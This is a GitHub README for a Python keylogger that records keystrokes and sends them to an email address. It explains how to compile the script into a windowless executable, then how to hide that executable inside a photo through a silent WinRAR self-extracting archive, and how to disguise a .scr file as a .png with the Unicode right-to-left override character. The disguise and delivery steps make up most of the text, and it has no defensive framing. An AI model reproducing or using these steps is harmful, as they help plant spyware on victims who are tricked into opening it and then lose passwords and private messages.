# [python-keylogger](https://github.com/EmaBixD/python-keylogger)

Keylogger made with python that records keys and sends them to an email address.

## Requirements

- pynput

## BUILD AN EXECUTABLE FROM PYTHON FILE

### Installing pip

- ```py get-pip.py```

### Installing pyinstaller with pip

- ```pip install pyinstaller```

### Using pyinstaller

With prompt opened in the same directory of file.py type:
```pyinstaller --noconsole --onefile file.py```

## HOW TO HIDE ANY EXECUTABLE INSIDE A PHOTO USING **WINRAR**

1. Select both (file and photo) and press "Add to an archive"
2. Check "Create SFX archive"
3. "Advanced" tab -> press "SFX options"
	- ```Setup``` -> Run after extraction: first put image and then executable with file extension
	- ```Modes``` -> Check "Unpack to temporary folder", select "Hide all"
	- ```(OPTIONAL) Text and icon``` -> "Load SFX icon from the file" to give a preview of the file
	- ```Update``` -> Check "Overwrite all files"
4. Confirm all

## CHANGING FILE EXTENSION: FROM EXE TO PNG

1. Rename "example.exe" to "example.scr" (same properties)
2. Add "gnp" before ".scr" ("examplegnp.scr")
3. Rename again and right click after "example" and before "gnp.scr"
4. Choose "Insert Unicode control character" -> "RLO" (only "gnp.scr" part will be rotated showing "rcs.png")
5. Save and make sure to not remove "rcs", otherwise executable will not work!

## CREDITS:

***[Script](https://github.com/misbah4064/keylogger_sends_email)***

***[Hiding](https://www.youtube.com/watch?v=cXEkSQl9wmw)***
